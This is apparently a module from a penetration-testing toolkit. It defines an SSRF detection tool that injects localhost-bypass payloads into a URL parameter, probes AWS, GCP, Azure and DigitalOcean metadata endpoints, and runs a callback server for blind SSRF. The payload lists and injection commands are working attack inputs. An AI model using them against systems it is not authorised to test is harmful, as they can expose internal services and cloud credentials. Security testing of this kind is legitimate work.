"""SSRF detection tool — payload injection, callback server, cloud metadata checks."""
from __future__ import annotations

import json
import logging
from typing import Any

from tools.base import BasePentestTool

logger = logging.getLogger(__name__)

# Common SSRF payloads for cloud metadata endpoints
_CLOUD_METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",           # AWS
    "http://169.254.169.254/metadata/v1/",                 # DigitalOcean
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/instance",            # Azure
]

_SSRF_BYPASS_PAYLOADS = [
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://localhost",
    "http://[::1]",
    "http://0x7f000001",
    "http://2130706433",
    "http://127.1",
    "http://127.0.0.1.nip.io",
]


class SsrfDetectTool(BasePentestTool):
    """SSRF detection with callback server and payload generation."""

    name = "ssrf_detect"
    description = (
        "SSRF detection — inject payloads into URL parameters, "
        "check cloud metadata access, callback-based blind SSRF detection."
    )

    ACTIONS: dict[str, dict[str, Any]] = {
        "ssrf_basic": {
            "cmd": [
                "python3", "-c",
                "import requests,json,sys; "
                "payloads={payloads}; results=[]; "
                "[results.append({{'payload':p,'status':r.status_code,'length':len(r.text),'snippet':r.text[:200]}}) "
                "for p in payloads if (r:=requests.get('{url}'.replace('{inject_param}',p),timeout=5,allow_redirects=False)) or True]; "
                "print(json.dumps(results))",
            ],
            "timeout": 60,
            "description": "Test URL parameter for SSRF with common payloads",
        },
        "ssrf_cloud_meta": {
            "cmd": [
                "python3", "-c",
                "import requests,json; "
                "urls={cloud_urls}; results=[]; "
                "[results.append({{'url':u,'status':r.status_code,'body':r.text[:500]}}) "
                "for u in urls if (r:=requests.get(u,timeout=3,headers={{'Metadata-Flavor':'Google'}})) or True]; "
                "print(json.dumps(results))",
            ],
            "timeout": 30,
            "description": "Check if cloud metadata endpoints are accessible (indicates SSRF or misconfigured network)",
        },
        "ssrf_callback": {
            "cmd": [
                "python3", "-c",
                "import http.server,threading,time,json,requests; "
                "hits=[]; "
                "class H(http.server.BaseHTTPRequestHandler):\n"
                "  def do_GET(self):\n"
                "    hits.append({{'path':self.path,'headers':dict(self.headers)}})\n"
                "    self.send_response(200); self.end_headers()\n"
                "  def log_message(self,*a): pass\n"
                "s=http.server.HTTPServer(('0.0.0.0',{callback_port}),H); "
                "t=threading.Thread(target=s.serve_forever,daemon=True); t.start(); "
                "callback='http://{callback_host}:{callback_port}/ssrf-test'; "
                "requests.get('{url}'.replace('{inject_param}',callback),timeout=10); "
                "time.sleep({wait_seconds}); s.shutdown(); "
                "print(json.dumps({{'callback_url':callback,'hits':hits,'vulnerable':len(hits)>0}}))",
            ],
            "timeout": 60,
            "description": "Blind SSRF detection via callback server",
        },
        "ssrf_generate_payloads": {
            "cmd": [],  # Pure Python
            "timeout": 5,
            "description": "Generate SSRF bypass payloads for manual testing",
        },
    }

    async def execute(
        self,
        action: str,
        url: str = "",
        inject_param: str = "FUZZ",
        callback_host: str = "",
        callback_port: int = 8888,
        wait_seconds: int = 5,
        timeout: int = 60,
    ) -> str:
        if action not in self.ACTIONS:
            return self._unknown_action(action)

        if action == "ssrf_generate_payloads":
            return self._generate_payloads(url, inject_param)

        spec = self.ACTIONS[action]
        payloads = json.dumps(_SSRF_BYPASS_PAYLOADS)
        cloud_urls = json.dumps(_CLOUD_METADATA_URLS)
        cmd = [
            c.format(
                url=url, inject_param=inject_param, payloads=payloads,
                cloud_urls=cloud_urls, callback_host=callback_host,
                callback_port=callback_port, wait_seconds=wait_seconds,
            )
            for c in spec["cmd"]
        ]
        effective_timeout = min(timeout, spec.get("timeout", 60))

        return await self._run(
            action=action,
            cmd=cmd,
            timeout=effective_timeout,
            target_hint=url,
        )

    def _generate_payloads(self, url: str, inject_param: str) -> str:
        """Generate SSRF payload variants."""
        base_payloads = _SSRF_BYPASS_PAYLOADS + _CLOUD_METADATA_URLS
        if url and inject_param:
            full_urls = [url.replace(inject_param, p) for p in base_payloads]
        else:
            full_urls = base_payloads

        return json.dumps({
            "payloads": base_payloads,
            "full_urls": full_urls[:20],
            "note": "Test each payload against URL parameters that accept URLs, file paths, or redirects",
        }, indent=2)
